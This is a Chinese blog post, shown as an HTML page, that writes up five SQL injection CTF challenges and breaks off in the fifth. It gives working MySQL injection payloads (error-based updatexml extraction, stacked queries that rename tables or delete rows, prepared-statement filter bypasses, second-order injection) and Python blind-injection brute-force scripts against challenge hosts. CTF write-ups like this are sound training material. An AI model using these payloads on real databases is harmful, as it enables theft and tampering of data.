@@ -1,0 +1,183 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="sql注入"><meta name="keywords" content="SQL注入"><meta name="author" content="uf9n1x-海屿"><meta name="copyright" content="uf9n1x-海屿"><title>sql注入 | uf9n1x's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  hexoVersion: '5.4.2'
+} </script><meta name="generator" content="Hexo 5.4.2"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-number">1.</span> <span class="toc-text">（一）[极客大挑战 2019]HardSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E3%80%90%E9%9A%8F%E4%BE%BF%E6%B3%A8%E3%80%91"><span class="toc-number">2.</span> <span class="toc-text">（二）强网杯2019【随便注】</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">2.0.0.0.1.</span> <span class="toc-text">堆叠注入原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BE%E4%B8%AA%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-number">2.0.0.0.2.</span> <span class="toc-text">举个堆叠注入攻击的例子</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-number">2.0.0.0.3.</span> <span class="toc-text">堆叠注入的局限性</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E9%87%8D%E5%91%BD%E5%90%8D-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">2. 方法一：重命名+堆叠注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-October-2019-Twice-SQL-Injection"><span class="toc-number">3.</span> <span class="toc-text">(三)October 2019 Twice SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89-GYCTF2020-Ezsqli%EF%BC%88bool-%E7%9B%B2%E6%B3%A8%EF%BC%8C%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">（四）[GYCTF2020]Ezsqli（bool 盲注，无列名注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%EF%BC%9A%E8%A1%A5%E5%85%852%EF%BC%81%EF%BC%81%EF%BC%81"><span class="toc-number">3.1.1.</span> <span class="toc-text">注：补充2！！！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join"><span class="toc-number">3.2.</span> <span class="toc-text">join</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89-RCTF2015-EasySQL"><span class="toc-number">4.</span> <span class="toc-text">（五）[RCTF2015]EasySQL</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdnjson.com/images/2023/04/14/avator.jpg"></div><div class="author-info__name text-center">uf9n1x-海屿</div><div class="author-info__description text-center">webSec</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/uf9n1x">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">21</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">16</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">11</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Some links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.cnblogs.com/uf9n1x/">博客园</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.yuque.com/uf9n1x">语雀</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://music.163.com/">Music</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdnjson.com/images/2023/04/15/1.webp#https://s1.ax1x.com/2023/04/14/p9Sd0ns.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">uf9n1x's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/gallery">相册</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">sql注入</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-09-13</time><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">3k</span><span class="post-meta__separator">|</span><span>阅读时长: 11 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="（一）-极客大挑战-2019-HardSQL"><a href="#（一）-极客大挑战-2019-HardSQL" class="headerlink" title="（一）[极客大挑战 2019]HardSQL"></a>（一）[极客大挑战 2019]HardSQL</h1><span id="more"></span>
+
+<p>进入后是sql注入页面，过滤了一些字符，先进行fuzz测试。</p>
+<p>发现过滤了union，双写也无法绕过，所以不能使用常规的方法进行注入。但发现没有过滤extractvalue和updatexml。<br>也过滤了空格，使用括号绕过。<br>1.首先，注数据库名称</p>
+<p>username=1’or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=1</p>
+<p>当前数据库名：geek</p>
+<p>2.然后得表名(过滤=,使用like代替)</p>
+<p>username=admin’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=1<br>表名：H4rDsq1</p>
+<p>3.得到字段名</p>
+<p>username=admin’or(updatexml(1,concat(0x7e，(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(H4rDsq1)),0x7e),1))%23&amp;password=1</p>
+<p>字段名：id,username,password</p>
+<p>4.获取用户名和密码</p>
+<p>username=admin’or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=1</p>
+<p><em><strong>！！！</strong></em>这里只能拿到一部分flag，显示不全</p>
+<p>需要使用left()和right()左右进行拼接</p>
+<p>username=admin’or(updatexml(1,concat(0x7e,(select(left(password,25))from(H4rDsq1)),0x7e),1))%23&amp;password=1<br>username=admin’or(updatexml(1,concat(0x7e,(select(right(password,25))from(H4rDsq1)),0x7e),1))%23&amp;password=1</p>
+<p>得到flag： flag{b281390b-acf4-4c74-8450-6ae768d24655}</p>
+<h1 id="（二）强网杯2019【随便注】"><a href="#（二）强网杯2019【随便注】" class="headerlink" title="（二）强网杯2019【随便注】"></a>（二）强网杯2019【随便注】</h1><ol>
+<li>堆叠注入学习(堆叠查询，Stacked Queries)</li>
+</ol>
+<p>堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，<strong>堆叠注入可以用于执行任何SQL语句。</strong></p>
+<h5 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h5><p>在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。</p>
+<h5 id="举个堆叠注入攻击的例子"><a href="#举个堆叠注入攻击的例子" class="headerlink" title="举个堆叠注入攻击的例子"></a>举个堆叠注入攻击的例子</h5><p>执行查询时，第一个语句执行信息查询，第二个语句则将表user的所有内容给删除了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id =1;delete from users;</span><br></pre></td></tr></table></figure>
+
+<h5 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h5><p>堆叠注入并不是在每种情况下都能使用的。大多数时候，因为API或数据库引擎的不支持，堆叠注入都无法实现。</p>
+<p><img src="https://img2018.cnblogs.com/i-beta/1790307/202002/1790307-20200225003323819-1725659763.png" alt="img"></p>
+<h2 id="2-方法一：重命名-堆叠注入"><a href="#2-方法一：重命名-堆叠注入" class="headerlink" title="2. 方法一：重命名+堆叠注入"></a>2. 方法一：重命名+堆叠注入</h2><p><strong>1. 发现可以利用 or 把表中所有数据都查询出来，但是并没有我们需要的flag</strong></p>
+<p><img src="https://img2018.cnblogs.com/i-beta/1790307/202002/1790307-20200225003347819-1562966554.png" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/20163356-40b04356021c1aee.png" alt="img"></p>
+<p> 2.先看一下库名，发现很多函数都被过滤了。由于select被过滤了，union查询也就用不上了。**</p>
+<p><img src="https://img2018.cnblogs.com/i-beta/1790307/202002/1790307-20200225003359667-1703393112.png" alt="img"></p>
+<p>3.尝试一下堆叠注入，果然可以，把全部库名都给查出来了</p>
+<p><img src="https://img2018.cnblogs.com/i-beta/1790307/202002/1790307-20200225003413628-1565289472.png" alt="img"></p>
+<ol start="4">
+<li>OK继续查表名</li>
+</ol>
+<p><img src="https://img2018.cnblogs.com/i-beta/1790307/202002/1790307-20200225003429448-1539844908.png" alt="img"></p>
+<ol start="5">
+<li>查看表结构 ，可以发现flag在<code>1919810931114514</code>表里**</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;desc `1919810931114514`;#</span><br></pre></td></tr></table></figure>
+
+<p>　　<img src="https://img2018.cnblogs.com/i-beta/1790307/202002/1790307-20200225003453638-1441438599.png" alt="img"></p>
+<p> 注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p>
+<p>eg. mysql&gt; SELECT * FROM <code>table</code> WHERE <code>id</code> = ‘123’ ;</p>
+<p>1919810931114514必须用反单引号括起来（但是words不需要，应该是和数据类型有关）</p>
+<p><strong>6. 再查看words表的结构，发现一共有id和data两列。</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;;desc words;#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/i-beta/1790307/202002/1790307-20200225003524767-420720302.png" alt="img"></p>
+<p> <strong>那么可以猜测我们提交查询的窗口就是在这个表里查询数据的</strong></p>
+<p><strong>7. 那么查询语句很有可能是 : selsect id,data from words where id =</strong></p>
+<p><strong>因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1’ or 1=1#爆出表所有内容就可以查flag啦</strong></p>
+<p><strong>payload</strong>:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/i-beta/1790307/202002/1790307-20200225003553488-841750902.png" alt="img"></p>
+<ol start="8">
+<li>再用一下一开始的操作id=1’ or 1=1#**</li>
+</ol>
+<p><img src="https://img2018.cnblogs.com/i-beta/1790307/202002/1790307-20200225003608261-1256786379.png" alt="img"></p>
+<p> 0x03 方法二：预处理语句+堆叠注入</p>
+<p>预处理语句使用方式：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/20163356-cfac6e9c7095bca4.png" alt="img"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> x <span class="keyword">from</span> <span class="string">&#x27;[my sql sequece]&#x27;</span>;  <span class="operator">/</span><span class="operator">/</span>预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> x; <span class="operator">/</span><span class="operator">/</span>执行预定义<span class="keyword">SQL</span>语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> <span class="operator">||</span> <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> x; <span class="operator">/</span><span class="operator">/</span>删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
+
+<p>　预定义语句也可以通过变量进行传递:　</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@tn</span> <span class="operator">=</span> <span class="string">&#x27;hahaha&#x27;</span>; <span class="operator">/</span><span class="operator">/</span>存储表名</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@sql</span> <span class="operator">=</span> concat(<span class="string">&#x27;select * from &#x27;</span>, <span class="variable">@tn</span>); <span class="operator">/</span><span class="operator">/</span>存储<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">PREPARE</span> x <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="operator">/</span><span class="operator">/</span>预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> x; <span class="operator">/</span><span class="operator">/</span>执行预定义<span class="keyword">SQL</span>语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> <span class="operator">||</span> <span class="keyword">DROP</span>) x; <span class="operator">/</span><span class="operator">/</span>删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
+
+<p>本题即可利用 char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。</p>
+<p>char(115,101,108,101,99,116)&lt;—–&gt;’select’</p>
+<p>payload1：不使用变量</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;PREPARE x from concat(char(115,101,108,101,99,116), &#x27;</span> <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>` <span class="string">&#x27;);EXECUTE x;#</span></span><br></pre></td></tr></table></figure>
+
+<p>payload2：使用变量</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;SET @sqli=concat(char(115,101,108,101,99,116),&#x27;</span><span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`<span class="string">&#x27;);PREPARE x from @sqli;EXECUTE x;#</span></span><br></pre></td></tr></table></figure>
+
+<p>payload3：只是用contact(),不使用char()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;PREPARE x from concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect<span class="string">&#x27;, &#x27;</span> <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>` <span class="string">&#x27;);EXECUTE x;#</span></span><br></pre></td></tr></table></figure>
+
+<p>直接输入这三个payload的任何一个都能获得flag</p>
+<h1 id="三-October-2019-Twice-SQL-Injection"><a href="#三-October-2019-Twice-SQL-Injection" class="headerlink" title="(三)October 2019 Twice SQL Injection"></a>(三)<em><strong>October 2019 Twice SQL Injection</strong></em></h1><p>标题明说二次注入（有埋伏？），先常规二次注入测试：注册用户名：admin”# 密码：123,并登录。（此处没有任何过滤？）<img src="C:\Users\小杨\Desktop\pp.png">（info)</p>
+<p>进行fuzz测试，结果发现常用符号传入被转义（此页面暂时放弃）<img src="C:\Users\小杨\Desktop\111.png"></p>
+<p>注意还有思路：注册+登录，将sql语句当用户名写入数据库，然后登陆，使语句执行（因为第一次注册登录测试中并未对”#进行waf）</p>
+<p>注册尝试</p>
+<p>用户名：xxx” union select database()#</p>
+<p>密码：123456</p>
+<p><img src="C:\Users\小杨\Desktop\333.png"></p>
+<p>登录成功，但无回显，尝试其他闭合方式，最终为单引号闭合</p>
+<p>用户名：xxx‘ union select database()#</p>
+<p>密码：123</p>
+<p><img src="C:\Users\小杨\Desktop\5555.png"></p>
+<p>可以看到，成功爆出当前数据库，则重复以上流程，爆出flag</p>
+<p>xxx’ union select database() #</p>
+<p>xxx’ union select group_concat(table_name) from information_schema.tables where table_schema=’ctftraining’ #</p>
+<p>xxx’ union select group_concat(column_name) from information_schema.columns where table_name=’flag’#</p>
+<p>xxx’ union select flag from flag #</p>
+<p><img src="C:\Users\小杨\Desktop\777.png"></p>
+<p>flag: flag{3ad7cee4-cfdc-4e9a-b858-dc7a32f6c654}</p>
+<h2 id="（四）-GYCTF2020-Ezsqli（bool-盲注，无列名注入）"><a href="#（四）-GYCTF2020-Ezsqli（bool-盲注，无列名注入）" class="headerlink" title="（四）[GYCTF2020]Ezsqli（bool 盲注，无列名注入）"></a><em><strong>（四）[GYCTF2020]Ezsqli</strong></em>（bool 盲注，无列名注入）</h2><p>打开,经典查询框，先随意提交1，post数据，抓包看一下<img src="C:\Users\小杨\Desktop\s.png"></p>
+<p>burp fuzz测试一下，可以看到常用的information，information_schema,or，union等关键字被过滤了，简单尝试后，发现没有回显，也没有报错，当语句为真时返回Nu1L，为假时返回V&amp;N，考虑布尔盲注。</p>
+<p>注：补充！！！</p>
+<p><em><strong>InnoDb引擎</strong></em><br>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名（即sys.schema_table_statistics查不出列段名）<br><em><strong>sys数据库</strong></em><br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。</p>
+<p>跑表名：脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2d3886f0-f7f7-4dd3-beb7-38a2a02ff2e6.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1))=&#123;&#125;)^1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        py = payload.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: py&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>得到两个表名：users233333333333333,f1ag_1s_h3r3_hhhhh</p>
+<h3 id="注：补充2！！！"><a href="#注：补充2！！！" class="headerlink" title="注：补充2！！！"></a><em><strong>注：补充2！！！</strong></em></h3><p>当or被过滤（没过滤in）时，可利用innodb存储引擎获取表名</p>
+<ul>
+<li><strong>mysql.innodb_table_stats</strong> (此表中库名字段是database_name，而非table_schema)</li>
+<li><strong>mysql.innodb_index_stats</strong></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure>
+
+<h2 id="join"><a href="#join" class="headerlink" title="join"></a><em><strong>join</strong></em></h2><p>通过join进行无列名注入获取列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b)c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;id&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id))c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;username&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,username))c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;password&#x27;</span></span><br><span class="line"></span><br><span class="line">在学习大佬wp时还看到利用<span class="keyword">join</span>绕过逗号过滤，tql</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">不用逗号</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+
+<p><em><strong>注：补充3！！！</strong></em></p>
+<p>无列名注入</p>
+<p>过滤了union的无列名注入没学过 参考y1ng师傅的wp<br><a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/1782.html">https://www.gem-love.com/ctf/1782.html</a><br>看完只能感叹大佬tql<br>核心思想</p>
+<p>假设 flag 为 flag {bbbbb}，对于 payload 这个两个 select 查询的比较，是按位比较的，即先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前者的 ASCII 大，不管总长度如何，ASCII 大的则大，这个不难懂，和 c 语言的 strcmp() 函数原理一样，举几个例子：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">glag <span class="operator">&gt;</span> flag&#123;bbbbb&#125;</span><br><span class="line">alag&#123;zzzzzzzzzzz&#125; <span class="operator">&lt;</span> flag&#123;bbbbb&#125;</span><br><span class="line">a <span class="operator">&lt;</span> flag&#123;bbbbb&#125;</span><br><span class="line">z <span class="operator">&gt;</span> flag&#123;bbbbb&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这样的按位比较过程中，因为在里层的 for() 循环，字典顺序是从 ASCII 码小到大来枚举并比较的，假设正确值为 b，那么字典跑到 b 的时候 b=b 不满足 payload 的大于号，只能继续下一轮循环，c&gt;b 此时满足了，题目返回真，出现了 Nu1L 关键字，这个时候就需要记录 flag 的值了，但是此时这一位的 char 是 c，而真正的 flag 的这一位应该是 b 才对，所以 flag += chr(char-1)，这就是为什么在存 flag 时候要往前偏移一位的原因<br>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://2d3886f0-f7f7-4dd3-beb7-38a2a02ff2e6.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        flag1 = flag+<span class="built_in">chr</span>(x)</span><br><span class="line">        payload = <span class="string">&#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="built_in">format</span>(flag1)</span><br><span class="line"></span><br><span class="line">        data = &#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;</span><br><span class="line">        re = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    flag += <span class="built_in">chr</span>(x-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="built_in">print</span>(flag.lower())//跑出的flag大写无法提交，转换小写）</span><br></pre></td></tr></table></figure>
+
+<p>跑出flag：FLAG{7586A683-8049-49B5-8A5B-811AE0D94853}<br>                 flag{7586a683-8049-49b5-8a5b-811ae0d94853} </p>
+<p>补充四4：无列名注入【<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lee-404/p/12833788.html%E3%80%91">https://www.cnblogs.com/Lee-404/p/12833788.html】</a></p>
+<h1 id="（五）-RCTF2015-EasySQL"><a href="#（五）-RCTF2015-EasySQL" class="headerlink" title="（五）[RCTF2015]EasySQL"></a><em><strong>（五）[RCTF2015]EasySQL</strong></em></h1><p>打开题目，先尝试admin登录，error。再尝试万能密码登录，error</p>
+<p><img src="C:\Users\小杨\Desktop\a.png"></p>
+<p>看来只有注册了，注册用户名：’x”#密码：xx emai: xxx</p>
+<p>注册,登陆进去后,骚话一大堆（hahhaha),发现可以修改密码，尝试修改密码，结果出现报错。</p>
+<p><img src="C:\Users\小杨\Desktop\222222.png"></p>
